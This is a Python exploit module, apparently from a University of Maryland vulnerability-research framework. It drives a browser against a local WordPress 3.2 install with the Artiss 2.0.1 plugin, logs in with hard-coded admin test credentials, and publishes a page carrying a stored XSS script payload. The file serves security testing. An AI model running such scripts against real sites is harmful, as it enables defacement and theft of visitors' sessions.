
# Copyright 2013 University of Maryland.  All rights reserved.
# Use of this source code is governed by a BSD-style
# license that can be found in the LICENSE.TXT file.


import framework                        
import time

class Exploit (framework.Exploit):
    attributes = {'Name' : "OSVDB_83686",                        
                  'Description' : "Creates a post containing a XSS payload.",
                  'References' : [['OSVDB','83686'],['http://www.osvdb.org/show/osvdb/83686']],
                  'Target' : "Wordpress 3.2",
                  'TargetLicense' : '',
                  'Type' : "XSS",
                  'VulWikiPage' : "http://seamster.cs.umd.edu/vulwiki/index.php/OSVDB-83686",
                  'Plugin' : "Artiss 2.0.1",
                  'Privileged' : True 
                  }

    def __init__(self, visible=False):
        framework.Exploit.__init__(self, visible)
        return

    def exploit(self):
        payload = "<script>alert(\"Hi Kent!!\")</script>"
        driver = self.create_selenium_driver()
        driver.get("http://localhost/wordpress")
        self.logger.info("Page opened successfully: %s", driver.title)
        self.logger.info("uploading payload: %s", payload)
        driver.get("http://localhost/wordpress/wp-login.php")
        driver.find_element_by_id("user_login").clear()
        driver.find_element_by_id("user_login").send_keys(" wpadmin")                                                            
        driver.find_element_by_id("user_pass").clear()
        driver.find_element_by_id("user_pass").send_keys("wpadminpw21")
        driver.find_element_by_id("wp-submit").click()
        driver.get("http://127.0.0.1/wordpress/wp-admin/plugins.php")
        driver.get("http://127.0.0.1/wordpress/wp-admin/plugins.php?activate=true&plugin_status=all&paged=1&s=")
        driver.get("http://127.0.0.1/wordpress/wp-admin/post-new.php?post_type=page")
        driver.find_element_by_id("title").clear()
        driver.find_element_by_id("title").send_keys("Hacked Content")
        driver.find_element_by_id("content").clear()                                                                                                       
        driver.find_element_by_id("content").send_keys(payload)
        driver.find_element_by_id("publish").click()
        time.sleep(10)
        driver.cleanup()
        return                

    def verify(self):
        return True
